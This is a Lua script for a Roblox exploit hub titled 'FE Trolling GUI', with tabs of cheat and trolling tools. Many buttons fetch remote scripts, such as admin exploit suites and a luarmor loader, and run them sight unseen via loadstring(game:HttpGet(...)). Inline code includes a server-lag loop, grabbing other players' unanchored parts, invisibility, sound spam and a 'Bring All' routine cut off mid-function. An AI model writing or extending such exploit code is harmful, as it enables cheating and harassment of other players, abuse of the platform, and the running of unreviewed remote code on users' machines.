--[[
FE Trolling GUI

By Sky/dsgdfs

Last Updated 3/9/2024

Added Portal Gun

If you want me to add anything let me know in the discord or dm me

https://discord.gg/xwy5Cu62Vw

]]--
local string = "https://discord.gg/xwy5Cu62Vw"
local string2 = "https://discord.com/invite/jVf7eSrED9"
_G.guidragtype = 1
UserInputService = game:GetService("UserInputService")
local IsOnMobile = table.find({
	Enum.Platform.IOS,
	Enum.Platform.Android
}, UserInputService:GetPlatform())

if IsOnMobile then
	_G.infydtype = "https://raw.githubusercontent.com/yofriendfromschool1/mobile-delta-inf-yield/main/deltainfyield.txt"
	_G.guidragtype = "https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/Kavolibupdate"
else
	_G.infydtype = "https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"
	_G.guidragtype = "https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"
end
local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()
local Window = Fluent:CreateWindow({
	Title = "FE Trolling GUI",
	SubTitle = "By Sky/dsgdfs",
	TabWidth = 160,
	Size = UDim2.fromOffset(580, 460),
	Acrylic = false,
	Theme = "Dark",
	MinimizeKey = Enum.KeyCode.LeftControl
})
local Discord = Window:AddTab({
	Title = "Discords",
	Icon = "globe"
})
local Options = Fluent.Options
Discord:AddButton({
	Title = "Discord Invite",
	Description = "Copys Discord invite link",
	Callback = function()
		setclipboard(string)
	end
})
Discord:AddButton({
	Title = "Discord Invite OLD",
	Description = "Copys OLD Discord invite link",
	Callback = function()
		setclipboard(string2)
	end
})
local Admins = Window:AddTab({
	Title = "Admins",
	Icon = "globe"
})
Admins:AddButton({
	Title = "Infinite Yield FE",
	Description = "Infinite Yield FE",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
	end
})
Admins:AddButton({
	Title = "Infinite Store",
	Description = "loads a store to browse for plugins for Infinite Yield",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/Infinite-Store/Infinite-Store/main/main.lua"))()
	end
})
Admins:AddButton({
	Title = "Nameless Admin",
	Description = "Nameless Admin",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/FilteringEnabled/NamelessAdmin/main/Source'))()
	end
})
Admins:AddButton({
	Title = "Fates Admin",
	Description = "Fates Admin",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))();
	end
})
Admins:AddButton({
	Title = "Shattervast Admin",
	Description = "Shattervast Admin",
	Callback = function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub-Backup/main/%5BFE%5D%20Shattervast.lua'))()
	end
})
Admins:AddButton({
	Title = "Proton Free Admin",
	Description = "Proton Free Admin",
	Callback = function()
		_G.UI_Id = "default" --set this to "default" for the default ui
		loadstring(game:HttpGet('https://raw.githubusercontent.com/DigitalityScripts/roblox-scripts/main/Proton%20Free'))()
	end
})
Admins:AddButton({
	Title = "Proton 2 free Admin",
	Description = "Proton 2 free Admin",
	Callback = function()
			-- DEFAULT CMD BAR PREFIX IS ;
			-- DEFAULT CHAT PREFIX IS /
		_G.UI_Id = "default" --set this to "default" for the default ui
		loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/5e6e6cc1bb32fd926764d064e2c60a3b.lua"))()
	end
})
Admins:AddButton({
	Title = "Reviz Admin V2",
	Description = "Reviz Admin V2",
	Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/yofriendfromschool1/Sky-Hub/main/Reviz%20AdminV2"))()
	end
})
local GUIS = Window:AddTab({
	Title = "GUIS",
	Icon = "globe"
})
GUIS:AddButton({
	Title = "Arosia FE GUI",
	Description = "Arosia FE GUI",
	Callback = function()
		loadstring(Game:GetObjects("rbxassetid://1255908305")[1].Source)()
	end
})
GUIS:AddButton({
	Title = "Animations FE GUI 1",
	Description = "Animations FE GUI 1",
	Callback = function()
		local Gui = Instance.new("ScreenGui", game.CoreGui)
		Gui.Name = "FE Animations"
		local Background = Instance.new("Frame", Gui)
		Background.Name = "Background"
		Background.Active = true
		Background.BackgroundColor3 = Color3.fromRGB(220, 220, 255)
		Background.Transparency = 0.3
		Background.BorderSizePixel = 5
		Background.Draggable = true
		Background.Position = UDim2.new(0, 300, 0, 300)
		Background.Size = UDim2.new(0, 345, 0, 190)
		local Title = Instance.new("TextLabel", Background)
		Title.BackgroundTransparency = 1
		Title.Position = UDim2.new(0, 0, 0, -80)
		Title.Size = UDim2.new(0, 290, 1, 0)
		Title.Font = "SourceSansLight"
		Title.FontSize = "Size18"
		Title.Text = "FE Animations [by illremember]"
		Title.TextColor3 = Color3.fromRGB(20, 20, 25)
		local Chop = Instance.new("TextButton", Background)
		Chop.Name = "Chop"
		Chop.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
		Chop.BackgroundTransparency = 0.1
		Chop.BorderSizePixel = 0
		Chop.Position = UDim2.new(0, 120, 0, 30)
		Chop.Size = UDim2.new(0, 100, 0, 30)
		Chop.Font = "SourceSansItalic"
		Chop.FontSize = "Size18"
		Chop.Text = "Chop"
		Chop.TextColor3 = Color3.fromRGB(230, 230, 230)
		Chop.TextWrapped = true
		local Dance = Chop:Clone()
		Dance.Name = "Dance"
		Dance.Parent = Background
		Dance.Position = UDim2.new(0, 120, 0, 70)
		Dance.Text = "Dance"
		local ArmsOut = Chop:Clone()
		ArmsOut.Name = "ArmsOut"
		ArmsOut.Parent = Background
		ArmsOut.Position = UDim2.new(0, 10, 0, 110)
		ArmsOut.Text = "ArmsOut"
		local Stab = Chop:Clone()
		Stab.Name = "Stab"
		Stab.Parent = Background
		Stab.Position = UDim2.new(0, 10, 0, 30)
		Stab.Text = "Stab"
		local SmellyRun = Chop:Clone()
		SmellyRun.Name = "SmellyRun"
		SmellyRun.Parent = Background
		SmellyRun.Position = UDim2.new(0, 10, 0, 70)
		SmellyRun.Text = "SmellyRun"
		local rando = Chop:Clone()
		rando.Name = "rando"
		rando.Parent = Background
		rando.Position = UDim2.new(0, 120, 0, 110)
		rando.Text = "rando"
		local hmm = Chop:Clone()
		hmm.Name = "hmm"
		hmm.Parent = Background
		hmm.Position = UDim2.new(0, 120, 0, 150)
		hmm.Text = "hmm"
		local Kick = Chop:Clone()
		Kick.Name = "Kick"
		Kick.Parent = Background
		Kick.Position = UDim2.new(0, 10, 0, 150)
		Kick.Size = UDim2.new(0, 100, 0, 30)
		Kick.Text = "Kick"
		local Flying = Chop:Clone()
		Flying.Name = "Flying"
		Flying.Parent = Background
		Flying.Position = UDim2.new(0, 230, 0, 30)
		Flying.Size = UDim2.new(0, 100, 0, 30)
		Flying.Text = "Flying"
		local Arms = Chop:Clone()
		Arms.Name = "Arms"
		Arms.Parent = Background
		Arms.Position = UDim2.new(0, 230, 0, 70)
		Arms.Size = UDim2.new(0, 100, 0, 30)
		Arms.Text = "Arms"
		local Sword = Chop:Clone()
		Sword.Name = "Sword"
		Sword.Parent = Background
		Sword.Position = UDim2.new(0, 230, 0, 110)
		Sword.Size = UDim2.new(0, 100, 0, 30)
		Sword.Text = "Sword"
		local Insane = Chop:Clone()
		Insane.Name = "Insane"
		Insane.Parent = Background
		Insane.Position = UDim2.new(0, 230, 0, 150)
		Insane.Size = UDim2.new(0, 100, 0, 30)
		Insane.Text = "Insane"
 
--
		local plr = game:GetService("Players").LocalPlayer
		local mouse = plr:GetMouse()
		lpc = game:GetService("Players").LocalPlayer.Character
		weld1 = Instance.new("Weld")
		Chop.MouseButton1Down:connect(function()
			local gg = mouse.Target
			if gg ~= nil then
				for i, v in pairs(game:GetService("Players"):GetPlayers()) do
					AnimationId = "33169596"
					local Anim = Instance.new("Animation")
					Anim.AnimationId = "rbxassetid://" .. AnimationId
					local k = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
					k:Play()
					k:AdjustSpeed(1)
				end
			end
		end)
		Insane.MouseButton1Down:connect(function()
			local gg = mouse.Target
			if gg ~= nil then
				for i, v in pairs(game:GetService("Players"):GetPlayers()) do
					AnimationId = "33796059"
					local Anim = Instance.new("Animation")
					Anim.AnimationId = "rbxassetid://" .. AnimationId
					local k = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
					k:Play()
					k:AdjustSpeed(10000)
				end
			end
		end)
		Arms.MouseButton1Down:connect(function()
			local gg = mouse.Target
			if gg ~= nil then
				for i, v in pairs(game:GetService("Players"):GetPlayers()) do
					AnimationId = "33169583"
					local Anim = Instance.new("Animation")
					Anim.AnimationId = "rbxassetid://" .. AnimationId
					local k = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
					k:Play()
					k:AdjustSpeed(1)
				end
			end
		end)
		Sword.MouseButton1Click:connect(function()
			local gg = mouse.Target
			if gg ~= nil then
				for i, v in pairs(game:GetService("Players"):GetPlayers()) do
					AnimationId = "35978879"
					local Anim = Instance.new("Animation")
					Anim.AnimationId = "rbxassetid://" .. AnimationId
					local k = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
					k:Play()
					k:AdjustSpeed(1)
				end
			end
		end)
		hmm.MouseButton1Down:connect(function()
			local gg = mouse.Target
			if gg ~= nil then
				for i, v in pairs(game:GetService("Players"):GetPlayers()) do
					AnimationId = "33855276"
					local Anim = Instance.new("Animation")
					Anim.AnimationId = "rbxassetid://" .. AnimationId
					local k = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
					k:Play()
					k:AdjustSpeed(1)
				end
			end
		end)
		rando.MouseButton1Down:connect(function()
			local gg = mouse.Target
			if gg ~= nil then
				for i, v in pairs(game:GetService("Players"):GetPlayers()) do
					AnimationId = "48977286"
					local Anim = Instance.new("Animation")
					Anim.AnimationId = "rbxassetid://" .. AnimationId
					local k = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
					k:Play()
					k:AdjustSpeed(1)
				end
			end
		end)
		Dance.MouseButton1Down:connect(function()
			local gg = mouse.Target
			if gg ~= nil then
				for i, v in pairs(game:GetService("Players"):GetPlayers()) do
					AnimationId = "35654637"
					local Anim = Instance.new("Animation")
					Anim.AnimationId = "rbxassetid://" .. AnimationId
					local k = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
					k:Play()
					k:AdjustSpeed(1)
				end
			end
		end)
		Stab.MouseButton1Down:connect(function()
			local gg = mouse.Target
			if gg ~= nil then
				for i, v in pairs(game:GetService("Players"):GetPlayers()) do
					AnimationId = "66703241"
					local Anim = Instance.new("Animation")
					Anim.AnimationId = "rbxassetid://" .. AnimationId
					local k = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
					k:Play()
					k:AdjustSpeed(1)
				end
			end
		end)
		Kick.MouseButton1Down:connect(function()
			local gg = mouse.Target
			if gg ~= nil then
				for i, v in pairs(game:GetService("Players"):GetPlayers()) do
					AnimationId = "45737360"
					local Anim = Instance.new("Animation")
					Anim.AnimationId = "rbxassetid://" .. AnimationId
					local k = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
					k:Play()
					k:AdjustSpeed(1)
				end
			end
		end)
		Flying.MouseButton1Down:connect(function()
			local gg = mouse.Target
			if gg ~= nil then
				for i, v in pairs(game:GetService("Players"):GetPlayers()) do
					AnimationId = "46196309"
					local Anim = Instance.new("Animation")
					Anim.AnimationId = "rbxassetid://" .. AnimationId
					local k = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
					k:Play()
					k:AdjustSpeed(0.001)
				end
			end
		end)
		SmellyRun.MouseButton1Down:connect(function()
			local gg = mouse.Target
			if gg ~= nil then
				for i, v in pairs(game:GetService("Players"):GetPlayers()) do
					AnimationId = "30235165"
					local Anim = Instance.new("Animation")
					Anim.AnimationId = "rbxassetid://" .. AnimationId
					local k = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
					k:Play()
					k:AdjustSpeed(1)
				end
			end
		end)
		ArmsOut.MouseButton1Down:connect(function()
			local gg = mouse.Target
			if gg ~= nil then
				for i, v in pairs(game:GetService("Players"):GetPlayers()) do
					AnimationId = "27432691"
					local Anim = Instance.new("Animation")
					Anim.AnimationId = "rbxassetid://" .. AnimationId
					local k = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
					k:Play()
					k:AdjustSpeed(1)
				end
			end
		end)
	end
})
GUIS:AddButton({
	Title = "Animations FE GUI 2",
	Description = "Animations FE GUI 2",
	Callback = function()
		local Gui = Instance.new("ScreenGui", game.CoreGui)
		Gui.Name = "FE Animations"
		local Background = Instance.new("Frame", Gui)
		Background.Name = "Background"
		Background.Active = true
		Background.BackgroundColor3 = Color3.fromRGB(220, 190, 200)
		Background.Transparency = 0.3
		Background.BorderSizePixel = 5
		Background.Draggable = true
		Background.Position = UDim2.new(0, 300, 0, 300)
		Background.Size = UDim2.new(0, 345, 0, 190)
		local Title = Instance.new("TextLabel", Background)
		Title.BackgroundTransparency = 1
		Title.Position = UDim2.new(0, 0, 0, -80)
		Title.Size = UDim2.new(0, 290, 1, 0)
		Title.Font = "SourceSansLight"
		Title.FontSize = "Size18"
		Title.Text = "FE Animations [by illremember] IMPROVED"
		Title.TextColor3 = Color3.fromRGB(20, 20, 25)
		local BarrelRoll = Instance.new("TextButton", Background)
		BarrelRoll.Name = "BarrelRoll"
		BarrelRoll.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
		BarrelRoll.BackgroundTransparency = 0.1
		BarrelRoll.BorderSizePixel = 0
		BarrelRoll.Position = UDim2.new(0, 120, 0, 30)
		BarrelRoll.Size = UDim2.new(0, 100, 0, 30)
		BarrelRoll.Font = "SourceSansItalic"
		BarrelRoll.FontSize = "Size18"
		BarrelRoll.Text = "BarrelRoll"
		BarrelRoll.TextColor3 = Color3.fromRGB(230, 230, 230)
		BarrelRoll.TextWrapped = true
		local Dab = BarrelRoll:Clone()
		Dab.Name = "Dab"
		Dab.Parent = Background
		Dab.Position = UDim2.new(0, 120, 0, 70)
		Dab.Text = "Dab"
		local Crouch = BarrelRoll:Clone()
		Crouch.Name = "Crouch"
		Crouch.Parent = Background
		Crouch.Position = UDim2.new(0, 10, 0, 110)
		Crouch.Text = "Crouch"
		local Scream = BarrelRoll:Clone()
		Scream.Name = "Scream"
		Scream.Parent = Background
		Scream.Position = UDim2.new(0, 10, 0, 30)
		Scream.Text = "Scream"
		local HeadOff = BarrelRoll:Clone()
		HeadOff.Name = "HeadOff"
		HeadOff.Parent = Background
		HeadOff.Position = UDim2.new(0, 10, 0, 70)
		HeadOff.Text = "HeadOff"
		local LayDown = BarrelRoll:Clone()
		LayDown.Name = "LayDown"
		LayDown.Parent = Background
		LayDown.Position = UDim2.new(0, 120, 0, 110)
		LayDown.Text = "LayDown"
		local hmm2 = BarrelRoll:Clone()
		hmm2.Name = "hmm2"
		hmm2.Parent = Background
		hmm2.Position = UDim2.new(0, 120, 0, 150)
		hmm2.Text = "hmm2"
		local HeadTHROW = BarrelRoll:Clone()
		HeadTHROW.Name = "HeadTHROW"
		HeadTHROW.Parent = Background
		HeadTHROW.Position = UDim2.new(0, 10, 0, 150)
		HeadTHROW.Size = UDim2.new(0, 100, 0, 30)
		HeadTHROW.Text = "HeadTHROW"
		local Scared = BarrelRoll:Clone()
		Scared.Name = "Scared"
		Scared.Parent = Background
		Scared.Position = UDim2.new(0, 230, 0, 30)
		Scared.Size = UDim2.new(0, 100, 0, 30)
		Scared.Text = "Scared"
		local WARNING = BarrelRoll:Clone()
		WARNING.Name = "WARNING"
		WARNING.Parent = Background
		WARNING.Position = UDim2.new(0, 230, 0, 70)
		WARNING.Size = UDim2.new(0, 100, 0, 30)
		WARNING.Text = "WARNING"
		local LoopHead = BarrelRoll:Clone()
		LoopHead.Name = "LoopHead"
		LoopHead.Parent = Background
		LoopHead.Position = UDim2.new(0, 230, 0, 110)
		LoopHead.Size = UDim2.new(0, 100, 0, 30)
		LoopHead.Text = "LoopHead"
		local armturbine = BarrelRoll:Clone()
		armturbine.Name = "armturbine"
		armturbine.Parent = Background
		armturbine.Position = UDim2.new(0, 230, 0, 150)
		armturbine.Size = UDim2.new(0, 100, 0, 30)
		armturbine.Text = "armturbine"
 
--
		local plr = game:GetService("Players").LocalPlayer
		local mouse = plr:GetMouse()
		lpc = game:GetService("Players").LocalPlayer.Character
		weld1 = Instance.new("Weld")
		BarrelRoll.MouseButton1Down:connect(function()
			local gg = mouse.Target
			if gg ~= nil then
				for i, v in pairs(game:GetService("Players"):GetPlayers()) do
					AnimationId = "136801964"
					local Anim = Instance.new("Animation")
					Anim.AnimationId = "rbxassetid://" .. AnimationId
					local k = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
					k:Play()
					k:AdjustSpeed(1)
				end
			end
		end)
		armturbine.MouseButton1Down:connect(function()
			local gg = mouse.Target
			if gg ~= nil then
				for i, v in pairs(game:GetService("Players"):GetPlayers()) do
					AnimationId = "259438880"
					local Anim = Instance.new("Animation")
					Anim.AnimationId = "rbxassetid://" .. AnimationId
					local k = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
					k:Play()
					k:AdjustSpeed(100)
				end
			end
		end)
		LoopHead.MouseButton1Click:connect(function()
			local gg = mouse.Target
			if gg ~= nil then
				for i, v in pairs(game:GetService("Players"):GetPlayers()) do
					AnimationId = "35154961"
					local Anim = Instance.new("Animation")
					Anim.AnimationId = "rbxassetid://" .. AnimationId
					local k = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
					while wait(0.00703125) do
						k:Play()
						k:AdjustSpeed(640)
					end
				end
			end
		end)
		hmm2.MouseButton1Down:connect(function()
			local gg = mouse.Target
			if gg ~= nil then
				for i, v in pairs(game:GetService("Players"):GetPlayers()) do
					AnimationId = "148840371"
					local Anim = Instance.new("Animation")
					Anim.AnimationId = "rbxassetid://" .. AnimationId
					local k = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
					k:Play()
					k:AdjustSpeed(1)
				end
			end
		end)
		LayDown.MouseButton1Down:connect(function()
			local gg = mouse.Target
			if gg ~= nil then
				for i, v in pairs(game:GetService("Players"):GetPlayers()) do
					AnimationId = "282574440"
					local Anim = Instance.new("Animation")
					Anim.AnimationId = "rbxassetid://" .. AnimationId
					local k = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
					k:Play()
					k:AdjustSpeed(1)
				end
			end
		end)
		Dab.MouseButton1Down:connect(function()
			local gg = mouse.Target
			if gg ~= nil then
				for i, v in pairs(game:GetService("Players"):GetPlayers()) do
					AnimationId = "248263260"
					local Anim = Instance.new("Animation")
					Anim.AnimationId = "rbxassetid://" .. AnimationId
					local k = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
					k:Play()
					k:AdjustSpeed(1)
				end
			end
		end)
		Scream.MouseButton1Down:connect(function()
			local gg = mouse.Target
			if gg ~= nil then
				for i, v in pairs(game:GetService("Players"):GetPlayers()) do
					AnimationId = "180611870"
					local Anim = Instance.new("Animation")
					Anim.AnimationId = "rbxassetid://" .. AnimationId
					local k = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
					k:Play()
					k:AdjustSpeed(1)
				end
			end
		end)
		HeadTHROW.MouseButton1Down:connect(function()
			local gg = mouse.Target
			if gg ~= nil then
				for i, v in pairs(game:GetService("Players"):GetPlayers()) do
					AnimationId = "35154961"
					local Anim = Instance.new("Animation")
					Anim.AnimationId = "rbxassetid://" .. AnimationId
					local k = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
					k:Play()
					k:AdjustSpeed(1)
				end
			end
		end)
		Scared.MouseButton1Down:connect(function()
			local gg = mouse.Target
			if gg ~= nil then
				for i, v in pairs(game:GetService("Players"):GetPlayers()) do
					AnimationId = "180612465"
					local Anim = Instance.new("Animation")
					Anim.AnimationId = "rbxassetid://" .. AnimationId
					local k = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
					k:Play()
					k:AdjustSpeed(1)
				end
			end
		end)
		HeadOff.MouseButton1Down:connect(function()
			local gg = mouse.Target
			if gg ~= nil then
				for i, v in pairs(game:GetService("Players"):GetPlayers()) do
					AnimationId = "121572214"
					local Anim = Instance.new("Animation")
					Anim.AnimationId = "rbxassetid://" .. AnimationId
					local k = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
					k:Play()
					k:AdjustSpeed(1)
				end
			end
		end)
		Crouch.MouseButton1Down:connect(function()
			local gg = mouse.Target
			if gg ~= nil then
				for i, v in pairs(game:GetService("Players"):GetPlayers()) do
					AnimationId = "182724289"
					local Anim = Instance.new("Animation")
					Anim.AnimationId = "rbxassetid://" .. AnimationId
					local k = game:GetService("Players").LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
					k:Play()
					k:AdjustSpeed(1)
				end
			end
		end)
	end
})
GUIS:AddButton({
	Title = "Fuzk FE GUI",
	Description = "Fuzk FE GUI",
	Callback = function()
		local lplayer = game:GetService('Players').LocalPlayer
		local killing = false
		function GetPlayer(String)
			local Found = {}
			local strl = String:lower()
			if strl == "all" then
				for i, v in pairs(game:GetService("Players"):GetPlayers()) do
					table.insert(Found, v)
				end
			elseif strl == "others" then
				for i, v in pairs(game:GetService("Players"):GetPlayers()) do
					if v.Name ~= lplayer.Name then
						table.insert(Found, v)
					end
				end
			elseif strl == "me" then
				for i, v in pairs(game:GetService("Players"):GetPlayers()) do
					if v.Name == lplayer.Name then
						table.insert(Found, v)
					end
				end
			else
				for i, v in pairs(game:GetService("Players"):GetPlayers()) do
					if v.Name:lower():sub(1, #String) == String:lower() then
						table.insert(Found, v)
					end
				end
			end
			return Found
		end
		function ahh(thing)
			local asd = {
				'kill',
				'gui',
				'kill gui'
			}
			local f = string.upper(asd[math.random(1, #asd)])
			return f
		end
		ScreenGui = Instance.new("ScreenGui")
		MainGui = Instance.new("Frame")
		TextLabel = Instance.new("TextLabel")
		TextLabel_2 = Instance.new("TextLabel")
		main = Instance.new("Frame")
		Invis = Instance.new("TextButton")
		Lag = Instance.new("TextButton")
		Unchor = Instance.new("TextButton")
		oof = Instance.new("TextButton")
		Bringall = Instance.new("TextButton")
		PunishAll = Instance.new("TextButton")
		Page2Button = Instance.new("TextButton")
		Page2 = Instance.new("Frame")
		Goto = Instance.new("TextButton")
		View = Instance.new("TextButton")
		Noview = Instance.new("TextButton")
		Fling = Instance.new("TextButton")
		nofling = Instance.new("TextButton")
		Kill = Instance.new("TextButton")
		Page3Button = Instance.new("TextButton")
		BackToPage1 = Instance.new("TextButton")
		Player = Instance.new("TextBox")
		Page3 = Instance.new("Frame")
		BackToPage2 = Instance.new("TextButton")
		TextLabel_3 = Instance.new("TextLabel")
		ScreenGui.Parent = game.CoreGui
		MainGui.Name = "MainGui"
		MainGui.Parent = ScreenGui
		MainGui.BackgroundColor3 = Color3.new(0.580392, 0.580392, 0.580392)
		MainGui.BorderSizePixel = 0
		MainGui.Position = UDim2.new(0.526666641, 0, 0.404052436, 0)
		MainGui.Size = UDim2.new(0, 447, 0, 333)
		MainGui.Active = true
		MainGui.Draggable = true
		TextLabel.Parent = MainGui
		TextLabel.BackgroundColor3 = Color3.new(0.545098, 0.545098, 0.545098)
		TextLabel.BorderSizePixel = 0
		TextLabel.Position = UDim2.new(0, 0, 0.111164451, 0)
		TextLabel.Size = UDim2.new(0, 447, 0, 58)
		TextLabel.Font = Enum.Font.SourceSans
		TextLabel.FontSize = Enum.FontSize.Size32
		TextLabel.Text = "Fuzk Fe Gui"
		TextLabel.TextColor3 = Color3.new(0, 0, 0)
		TextLabel.TextSize = 30
		TextLabel_2.Parent = MainGui
		TextLabel_2.BackgroundColor3 = Color3.new(0.478431, 0.478431, 0.478431)
		TextLabel_2.BorderSizePixel = 0
		TextLabel_2.Size = UDim2.new(0, 447, 0, 38)
		TextLabel_2.Font = Enum.Font.SourceSans
		TextLabel_2.FontSize = Enum.FontSize.Size14
		TextLabel_2.Text = ""
		TextLabel_2.TextColor3 = Color3.new(0, 0, 0)
		TextLabel_2.TextSize = 14
		main.Name = "main"
		main.Parent = MainGui
		main.BackgroundColor3 = Color3.new(0.580392, 0.580392, 0.580392)
		main.BorderSizePixel = 0
		main.Position = UDim2.new(0, 0, 0.283932239, 0)
		main.Size = UDim2.new(0, 446, 0, 238)
		Invis.Name = "Invis"
		Invis.Parent = main
		Invis.BackgroundColor3 = Color3.new(0.611765, 0.611765, 0.611765)
		Invis.Position = UDim2.new(0.0358042195, 0, 0.0740150958, 0)
		Invis.Size = UDim2.new(0, 124, 0, 44)
		Invis.Font = Enum.Font.SourceSansBold
		Invis.FontSize = Enum.FontSize.Size24
		Invis.Text = "Invisible"
		Invis.TextColor3 = Color3.new(1, 1, 1)
		Invis.TextSize = 20
		Invis.TextStrokeTransparency = 0
		Invis.MouseButton1Down:connect(function()
			local player = game:GetService("Players").LocalPlayer
			position     = player.Character.HumanoidRootPart.Position
			wait(0.1)
			player.Character:MoveTo(position + Vector3.new(0, 1000000, 0))
			wait(0.1)
			humanoidrootpart = player.Character.HumanoidRootPart:clone()
			wait(0.1)
			player.Character.HumanoidRootPart:Destroy()
			humanoidrootpart.Parent = player.Character
			player.Character:MoveTo(position)
			wait()
		end)
		Lag.Name = "Lag"
		Lag.Parent = main
		Lag.BackgroundColor3 = Color3.new(0.611765, 0.611765, 0.611765)
		Lag.Position = UDim2.new(0.346766174, 0, 0.0740150958, 0)
		Lag.Size = UDim2.new(0, 124, 0, 44)
		Lag.Font = Enum.Font.SourceSansBold
		Lag.FontSize = Enum.FontSize.Size24
		Lag.Text = "Lag"
		Lag.TextColor3 = Color3.new(1, 1, 1)
		Lag.TextSize = 20
		Lag.TextStrokeTransparency = 0
		Lag.MouseButton1Down:connect(function()
			local lag_strength = 100
			local LocalPlayer = game:GetService("Players").LocalPlayer
			while game:GetService("RunService").RenderStepped:Wait() do
				for i = 1, lag_strength do
					local anim = Instance.new("Animation")
					anim.AnimationId = "Hackmaster12 Was Hereeee!!!" .. math.random()
					LocalPlayer.Character.Humanoid:LoadAnimation(anim):Play()
					anim:Destroy()
				end
			end
		end)
		Unchor.Name = "Unchor"
		Unchor.Parent = main
		Unchor.BackgroundColor3 = Color3.new(0.611765, 0.611765, 0.611765)
		Unchor.Position = UDim2.new(0.644305348, 0, 0.0740150958, 0)
		Unchor.Size = UDim2.new(0, 124, 0, 44)
		Unchor.Font = Enum.Font.SourceSansBold
		Unchor.FontSize = Enum.FontSize.Size24
		Unchor.Text = "Unanchored Parts Follow"
		Unchor.TextColor3 = Color3.new(1, 1, 1)
		Unchor.TextSize = 20
		Unchor.TextStrokeTransparency = 0
		Unchor.TextWrapped = true
		Unchor.MouseButton1Down:connect(function()
			local LocalPlayer = game:GetService("Players").LocalPlayer
			local unanchoredparts = {}
			local movers = {}
			for index, part in pairs(workspace:GetDescendants()) do
				if part:IsA("Part") and part.Anchored == false and part:IsDescendantOf(LocalPlayer.Character) == false then
					table.insert(unanchoredparts, part)
					part.Massless = true
					part.CanCollide = false
					if part:FindFirstChildOfClass("BodyPosition") ~= nil then
						part:FindFirstChildOfClass("BodyPosition"):Destroy()
					end
				end
			end
			for index, part in pairs(unanchoredparts) do
				local mover = Instance.new("BodyPosition", part)
				table.insert(movers, mover)
				mover.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
			end
			repeat
				for index, mover in pairs(movers) do
					mover.Position = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame:PointToWorldSpace(Vector3.new(0, 0, 5))
				end
				wait(0.5)
			until LocalPlayer.Character:FindFirstChild("Humanoid").Health <= 0
			for _, mover in pairs(movers) do
				mover:Destroy()
			end
		end)
		oof.Name = "oof"
		oof.Parent = main
		oof.BackgroundColor3 = Color3.new(0.611765, 0.611765, 0.611765)
		oof.Position = UDim2.new(0.038031321, 0, 0.316009164, 0)
		oof.Size = UDim2.new(0, 124, 0, 44)
		oof.Font = Enum.Font.SourceSansBold
		oof.FontSize = Enum.FontSize.Size24
		oof.Text = "Oof Sound"
		oof.TextColor3 = Color3.new(1, 1, 1)
		oof.TextSize = 20
		oof.TextStrokeTransparency = 0
		oof.MouseButton1Down:connect(function()
			repeat
				wait()
				for v, i in pairs(game:GetService("Players"):GetChildren()) do
					i.Character.Head.Died.Playing = true
				end
			until game:GetService("Players").LocalPlayer.Character.Humanoid.Health == 0
		end)
		Bringall.Name = "Bringall"
		Bringall.Parent = main
		Bringall.BackgroundColor3 = Color3.new(0.611765, 0.611765, 0.611765)
		Bringall.Position = UDim2.new(0.348993301, 0, 0.316009164, 0)
		Bringall.Size = UDim2.new(0, 124, 0, 44)
		Bringall.Font = Enum.Font.SourceSansBold
		Bringall.FontSize = Enum.FontSize.Size24
		Bringall.Text = "Bring All"
		Bringall.TextColor3 = Color3.new(1, 1, 1)
		Bringall.TextSize = 20
		Bringall.TextStrokeTransparency = 0
		Bringall.MouseButton1Down:connect(function()
			local SpreadAmount = 1
			local Spread_Amount = SpreadAmount - math.random(.0625, .1875)
			local toolamount = -8 * -8 / 4 + math.random(-1, 0)
			local LocalPlayer = game:GetService("Players").LocalPlayer
			local runservice = game:GetService("RunService")
			local characters = {}
